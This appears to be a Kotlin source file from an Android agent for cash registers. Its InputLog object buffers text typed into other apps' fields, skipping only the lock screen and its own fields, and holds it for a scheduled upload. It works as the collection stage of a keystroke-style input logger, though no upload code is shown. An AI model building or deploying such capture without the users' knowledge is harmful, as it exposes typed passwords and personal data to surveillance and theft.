package com.tillrecorder.agent

/**
 * Finished field text from this register, held until the upload tick.
 * The lock screen and this app's own fields are never added.
 */
object InputLog {
    private val gate = Any()
    private val ready = ArrayList<Pair<Long, String>>()
    private var pending: String? = null
    private var pendingKey = 0
    private var pendingAt = 0L

    fun note(sourceKey: Int, raw: CharSequence?) {
        val text = raw?.toString()?.replace('\n', ' ')?.trim()?.take(200) ?: return
        if (text.isEmpty()) return
        val now = System.currentTimeMillis()
        synchronized(gate) {
            if (pending != null && pendingKey != sourceKey) flushLocked()
            if (text == pending && sourceKey == pendingKey) return
            pending = text
            pendingKey = sourceKey
            pendingAt = now
        }
    }

    fun takeReady(): List<Pair<Long, String>> {
        synchronized(gate) {
            if (pending != null && System.currentTimeMillis() - pendingAt >= 700) flushLocked()
            if (ready.isEmpty()) return emptyList()
            val copy = ready.toList()
            ready.clear()
            return copy
        }
    }

    fun restore(entries: List<Pair<Long, String>>) {
        if (entries.isEmpty()) return
        synchronized(gate) {
            ready.addAll(0, entries)
        }
    }

    private fun flushLocked() {
        val text = pending ?: return
        val at = pendingAt
        pending = null
        if (ready.lastOrNull()?.second == text) return
        ready.add(at to text)
    }
}
